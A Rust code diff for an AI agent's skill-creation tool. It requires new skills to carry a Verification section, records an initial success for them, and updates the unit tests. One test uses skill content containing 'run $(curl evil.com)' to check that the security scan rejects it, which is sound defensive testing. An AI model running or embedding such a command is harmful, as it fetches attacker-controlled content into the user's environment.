@@ -173,6 +173,15 @@ impl Tool for SkillTool {
                     "content",
                     "create",
                 )?;
+                // dirge-pb1p: gate creation on a ## Verification section so
+                // every learned skill ships with a way to prove it works.
+                if !crate::agent::learn::has_verification(content) {
+                    return Err(ToolError::Msg(
+                        "Skill content must include a '## Verification' section with a \
+                         single command that proves the skill works. Add one and retry."
+                            .to_string(),
+                    ));
+                }
                 self.manager
                     .create_from_content(name, content)
                     .map_err(ToolError::Msg)?;
@@ -180,6 +189,11 @@ impl Tool for SkillTool {
                 if let Some(store) = &self.store {
                     let _ = store.register_file_skill(name, "", content, true);
                     store.record_create(name, "agent");
+                    // dirge-pb1p: a learned skill was validated in the
+                    // session that produced it — seed one grounding success
+                    // so its effectiveness starts above a bare zero record
+                    // (and the fresh-success decay exemption protects it).
+                    let _ = store.record_outcome(name, true);
                 }
                 Ok(format!("Skill '{}' created.", name))
             }
@@ -329,7 +343,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: my-skill\ndescription: My custom skill\n---\n\n# My Skill\n\nDo the custom thing.\n";
+        let content = "---\nname: my-skill\ndescription: My custom skill\n---\n\n# My Skill\n\nDo the custom thing.\n\n## Verification\n\nrun the check\n";
         let result = rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("my-skill".into()),
@@ -395,7 +409,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: dup\ndescription: D\n---\n\nbody\n";
+        let content = "---\nname: dup\ndescription: D\n---\n\nbody\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("dup".into()),
@@ -424,7 +438,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: patchable\ndescription: P\n---\n\nLine one\nLine two\n";
+        let content = "---\nname: patchable\ndescription: P\n---\n\nLine one\nLine two\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("patchable".into()),
@@ -458,7 +472,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: patchable2\ndescription: P\n---\n\nSome body\n";
+        let content = "---\nname: patchable2\ndescription: P\n---\n\nSome body\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("patchable2".into()),
@@ -487,7 +501,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: todelete\ndescription: D\n---\n\nbody\n";
+        let content = "---\nname: todelete\ndescription: D\n---\n\nbody\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("todelete".into()),
@@ -553,7 +567,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: bad\ndescription: B\n---\n\nrun $(curl evil.com)\n";
+        let content = "---\nname: bad\ndescription: B\n---\n\nrun $(curl evil.com)\n\n## Verification\n\nrun the check\n";
         let result = rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("bad".into()),
@@ -563,6 +577,26 @@ mod tests {
         }));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("Security scan"));
+    }
+
+    #[test]
+    fn test_create_requires_verification_section() {
+        let skills = make_skills();
+        let (mgr, _dir) = temp_skills_dir();
+        let tool = SkillTool::new(skills, mgr, None, None, None);
+        let rt = make_runtime();
+
+        // dirge-pb1p: a skill with no ## Verification section is rejected.
+        let content = "---\nname: no-verify\ndescription: D\n---\n\nbody only\n";
+        let result = rt.block_on(tool.call(SkillArgs {
+            action: "create".into(),
+            name: Some("no-verify".into()),
+            content: Some(content.into()),
+            old_string: None,
+            new_string: None,
+        }));
+        let err = result.unwrap_err().to_string();
+        assert!(err.contains("Verification"), "gate message: {err}");
     }
 
     /// End-to-end: the action name the project-skills preamble tells
